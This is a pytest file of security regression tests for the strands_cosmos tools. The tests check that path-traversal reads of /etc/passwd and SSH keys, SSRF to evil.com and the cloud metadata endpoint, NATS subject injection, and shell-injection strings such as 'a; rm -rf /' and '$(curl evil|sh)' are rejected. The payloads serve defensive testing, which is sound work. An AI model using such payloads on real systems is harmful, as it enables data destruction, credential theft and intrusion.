"""Security regression tests for the hardened Cosmos tools.

Each test maps to a Talos finding and proves the exploit is now blocked while
legitimate usage still works.
"""
from pathlib import Path

import pytest

from strands_cosmos.tools import _security as sec
from strands_cosmos.tools._common import _reject_injection


# ---------------------------------------------------------------------------
# Workspace path containment (Findings 4, 5, 8, 9, 10, 11, 12 / CWE-22)
# ---------------------------------------------------------------------------
@pytest.fixture
def workspace(monkeypatch, tmp_path):
    monkeypatch.setenv("COSMOS_WORKSPACE", str(tmp_path))
    monkeypatch.setenv("COSMOS_ALLOW_TEMP", "0")
    return tmp_path


def test_resolve_in_workspace_allows_inside(workspace):
    f = workspace / "video.mp4"
    f.write_bytes(b"x")
    resolved = sec.resolve_in_workspace(str(f))
    assert resolved == f.resolve()


def test_resolve_in_workspace_blocks_etc_passwd(workspace):
    with pytest.raises(sec.SecurityError):
        sec.resolve_in_workspace("/etc/passwd")


def test_resolve_in_workspace_blocks_traversal(workspace):
    with pytest.raises(sec.SecurityError):
        sec.resolve_in_workspace("../../etc/shadow")


def test_resolve_in_workspace_blocks_ssh_key(workspace):
    with pytest.raises(sec.SecurityError):
        sec.resolve_in_workspace("~/.ssh/id_rsa")


def test_resolve_output_blocks_bashrc(workspace):
    with pytest.raises(sec.SecurityError):
        sec.resolve_output_path("/home/user/.bashrc")


def test_resolve_output_allows_inside(workspace):
    out = sec.resolve_output_path(str(workspace / "sub" / "out.mp4"))
    assert out.parent.exists()


def test_symlink_escape_blocked(workspace):
    # A symlink inside the workspace pointing outside must be rejected.
    target = Path("/etc/passwd")
    link = workspace / "sneaky"
    try:
        link.symlink_to(target)
    except OSError:
        pytest.skip("cannot create symlink")
    with pytest.raises(sec.SecurityError):
        sec.resolve_in_workspace(str(link))


# ---------------------------------------------------------------------------
# SSRF guard (Finding 11 / CWE-918)
# ---------------------------------------------------------------------------
def test_validate_url_allows_localhost(monkeypatch):
    monkeypatch.delenv("COSMOS_ALLOW_REMOTE_URLS", raising=False)
    assert sec.validate_url("http://127.0.0.1:8080/v1/chat/completions")


def test_validate_url_blocks_external_by_default(monkeypatch):
    monkeypatch.delenv("COSMOS_ALLOW_REMOTE_URLS", raising=False)
    monkeypatch.delenv("COSMOS_URL_ALLOWLIST", raising=False)
    with pytest.raises(sec.SecurityError):
        sec.validate_url("https://evil.com/collect")


def test_validate_url_blocks_metadata_when_remote_allowed(monkeypatch):
    monkeypatch.setenv("COSMOS_ALLOW_REMOTE_URLS", "1")
    # 169.254.169.254 is the cloud metadata endpoint.
    with pytest.raises(sec.SecurityError):
        sec.validate_url("http://169.254.169.254/latest/meta-data/")


def test_validate_url_allowlist(monkeypatch):
    monkeypatch.setenv("COSMOS_URL_ALLOWLIST", "vlm.internal:8080")
    assert sec.validate_url("http://vlm.internal:8080/v1")


def test_validate_url_rejects_file_scheme():
    with pytest.raises(sec.SecurityError):
        sec.validate_url("file:///etc/passwd")


# ---------------------------------------------------------------------------
# NATS subject namespace (Finding 6)
# ---------------------------------------------------------------------------
def test_nats_subject_allows_namespace(monkeypatch):
    monkeypatch.delenv("COSMOS_NATS_NAMESPACE", raising=False)
    assert sec.validate_nats_subject("perception.vlm") == "perception.vlm"


def test_nats_subject_blocks_system_topic(monkeypatch):
    monkeypatch.delenv("COSMOS_NATS_NAMESPACE", raising=False)
    with pytest.raises(sec.SecurityError):
        sec.validate_nats_subject("_SYS.ACCOUNT.CLAIMS.UPDATE")


def test_nats_subject_blocks_injection_chars(monkeypatch):
    monkeypatch.delenv("COSMOS_NATS_NAMESPACE", raising=False)
    with pytest.raises(sec.SecurityError):
        sec.validate_nats_subject('cosmos"; touch pwned; echo "')


def test_nats_subject_blocks_wildcards(monkeypatch):
    monkeypatch.delenv("COSMOS_NATS_NAMESPACE", raising=False)
    with pytest.raises(sec.SecurityError):
        sec.validate_nats_subject("cosmos.>")


# ---------------------------------------------------------------------------
# safe_run: argv list, shell=False (Findings 1, 7 / CWE-78)
# ---------------------------------------------------------------------------
def test_safe_run_no_shell_interpretation(tmp_path):
    marker = tmp_path / "pwned"
    # If this were shell-interpreted, the marker would be created.
    payload = f'x"; touch {marker}; echo "'
    proc = sec.safe_run(["echo", payload])
    assert proc["ok"]
    assert not marker.exists(), "shell metacharacters were interpreted!"
    assert payload in proc["stdout"]


def test_safe_run_missing_binary():
    proc = sec.safe_run(["this_binary_does_not_exist_xyz"])
    assert not proc["ok"]
    assert proc["returncode"] == 127


# ---------------------------------------------------------------------------
# just_run injection guard (defense-in-depth, Finding 7)
# ---------------------------------------------------------------------------
def test_reject_injection_quote():
    assert _reject_injection(('x"; touch pwned; echo "',)) is not None


def test_reject_injection_semicolon():
    assert _reject_injection(("a; rm -rf /",)) is not None


def test_reject_injection_dollar_paren():
    assert _reject_injection(("$(curl evil)",)) is not None


def test_reject_injection_clean_args():
    assert _reject_injection(("nvidia/Cosmos-Reason2-2B", "./out", "fp16")) is None


# ---------------------------------------------------------------------------
# End-to-end: the actual tools block the documented exploits
# ---------------------------------------------------------------------------
def test_video_probe_blocks_etc_passwd(workspace):
    from strands_cosmos.tools.video_utils import video_probe
    res = video_probe("/etc/passwd")
    assert res["status"] == "error"


def test_video_probe_blocks_injection_payload(workspace):
    from strands_cosmos.tools.video_utils import video_probe
    # Classic recipe-interpolation RCE payload.
    res = video_probe('x"; touch /tmp/pwned_probe; echo "')
    assert res["status"] == "error"
    assert not Path("/tmp/pwned_probe").exists()


def test_image_read_blocks_ssh_key(workspace):
    from strands_cosmos.tools.image_read import image_read
    res = image_read("/root/.ssh/id_rsa")
    assert res["status"] == "error"


def test_image_read_allows_workspace_image(workspace):
    from strands_cosmos.tools.image_read import image_read
    img = workspace / "pic.png"
    # 1x1 PNG
    img.write_bytes(bytes.fromhex(
        "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4"
        "890000000a49444154789c6360000002000154a24f5f0000000049454e44ae42"
        "6082"
    ))
    res = image_read(str(img))
    assert res["status"] == "success"


def test_cosmos_inference_blocks_ssrf(workspace, monkeypatch):
    from strands_cosmos.tools.inference import cosmos_inference
    monkeypatch.delenv("COSMOS_ALLOW_REMOTE_URLS", raising=False)
    img = workspace / "x.jpg"
    img.write_bytes(b"\xff\xd8\xff\xe0jpeg")
    res = cosmos_inference(
        prompt="hi", image_path=str(img), server_url="https://evil.com/collect"
    )
    assert res["status"] == "error"


def test_cosmos_inference_blocks_file_read_escape(workspace, monkeypatch):
    from strands_cosmos.tools.inference import cosmos_inference
    monkeypatch.setenv("COSMOS_URL_ALLOWLIST", "")
    res = cosmos_inference(
        prompt="hi", image_path="/etc/passwd", server_url="http://127.0.0.1:8080/v1"
    )
    assert res["status"] == "error"


def test_nats_publish_blocks_system_subject(workspace):
    from strands_cosmos.tools.nats_pub import nats_publish
    res = nats_publish(subject="_SYS.REQ.X", payload='{"x":1}')
    assert res["status"] == "error"


# ---------------------------------------------------------------------------
# Identifier validation for shell-line `just` recipes (Finding 1/7 / CWE-78)
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("good", [
    "nvidia/Cosmos-Reason2-2B", "/abs/path/model", "./out/dir",
    "fp8", "vision_sft_nano", "Cosmos3-Nano", "trainer.max_iter=10 optimizer.lr=1e-5",
])
def test_validate_identifier_allows_legit(good):
    assert sec.validate_identifier(good, what="x") == good


@pytest.mark.parametrize("bad", [
    'x"; touch pwned; echo "', "a;b", "a|b", "a$(b)", "a`b`",
    "a&&b", "a>b", "a<b", "a\nb", "$(curl evil|sh)",
])
def test_validate_identifier_blocks_metachars(bad):
    with pytest.raises(sec.SecurityError):
        sec.validate_identifier(bad, what="x")


def test_validate_identifier_empty_policy():
    with pytest.raises(sec.SecurityError):
        sec.validate_identifier("", what="x")
    assert sec.validate_identifier("", what="x", allow_empty=True) == ""


# ---------------------------------------------------------------------------
# Env-var-routed tools reject injection / path escape (Finding 1/7 + CWE-22)
# These tools no longer interpolate untrusted args into `just {{param}}`.
# ---------------------------------------------------------------------------
def test_model_download_blocks_injection(workspace):
    from strands_cosmos.tools.model_download import cosmos_model_download
    res = cosmos_model_download(name='x"; touch pwned; echo "')
    assert res["status"] == "error"


def test_quantize_blocks_injection(workspace):
    from strands_cosmos.tools.quantize import cosmos_quantize
    res = cosmos_quantize(model_dir='a`id`b')
    assert res["status"] == "error"


def test_cosmos3_forward_dynamics_confines_input(workspace):
    from strands_cosmos.tools.cosmos3 import cosmos3_forward_dynamics
    # input outside the workspace -> SecurityError surfaced as error
    res = cosmos3_forward_dynamics(input_jsonl="/etc/passwd")
    assert res["status"] == "error"


def test_caption_batch_confines_video(workspace):
    from strands_cosmos.tools.cosmos3_extra import cosmos3_caption_batch
    res = cosmos3_caption_batch(video="/etc/passwd")
    assert res["status"] == "error"


def test_eval_videophy2_blocks_escape(workspace):
    from strands_cosmos.tools.cosmos3_extra import cosmos3_eval_videophy2
    res = cosmos3_eval_videophy2(results_dir="../../etc")
    assert res["status"] == "error"


def test_upsample_validates_aspect(workspace):
    from strands_cosmos.tools.cosmos3_extra import cosmos3_upsample_prompt
    res = cosmos3_upsample_prompt(description="a scene", aspect='16,9"; rm -rf /; echo "')
    assert res["status"] == "error"


def test_rtp_confines_output(workspace):
    from strands_cosmos.tools.rtp import rtp_capture_frame
    res = rtp_capture_frame(output_path="/etc/cron.d/evil")
    assert res["status"] == "error"


# ---------------------------------------------------------------------------
# Finding 1/7 (CWE-78) regression: cosmos_post_train config_path containment.
# Previously config_path reached `just {{config}}` guarded only by the denylist
# chokepoint; it is now workspace-confined + identifier-validated (two layers).
# ---------------------------------------------------------------------------
def test_post_train_blocks_path_outside_workspace(workspace):
    from strands_cosmos.tools.post_train import cosmos_post_train

    r = cosmos_post_train(config_path="/etc/passwd", model_family="reason2")
    assert r["status"] == "error"
    assert "workspace" in r["content"][0]["text"].lower()


def test_post_train_blocks_metachar_config(workspace):
    from strands_cosmos.tools.post_train import cosmos_post_train

    # A file whose name carries a quote (the `just` breakout vector). It exists,
    # so .resolve()/.exists() pass, but validate_identifier must reject it.
    bad = workspace / 'cfg".yaml'
    bad.write_text("x")
    r = cosmos_post_train(config_path=str(bad), model_family="reason2")
    assert r["status"] == "error"
    assert "invalid config_path" in r["content"][0]["text"]


def test_post_train_rejects_bad_family(workspace):
    from strands_cosmos.tools.post_train import cosmos_post_train

    cfg = workspace / "train.yaml"
    cfg.write_text("x")
    r = cosmos_post_train(config_path=str(cfg), model_family="evil", dry_run=True)
    assert r["status"] == "error"
    assert "model_family" in r["content"][0]["text"]


def test_post_train_rejects_bad_strategy(workspace):
    from strands_cosmos.tools.post_train import cosmos_post_train

    cfg = workspace / "train.yaml"
    cfg.write_text("x")
    r = cosmos_post_train(config_path=str(cfg), strategy="pwn", dry_run=True)
    assert r["status"] == "error"
    assert "strategy" in r["content"][0]["text"]


def test_post_train_allows_legit_dry_run(workspace):
    from strands_cosmos.tools.post_train import cosmos_post_train

    cfg = workspace / "train.yaml"
    cfg.write_text("x")
    r = cosmos_post_train(
        config_path=str(cfg), model_family="reason2", strategy="full", dry_run=True
    )
    assert r["status"] == "success"
    assert "post-train-reason2" in r["content"][0]["text"]
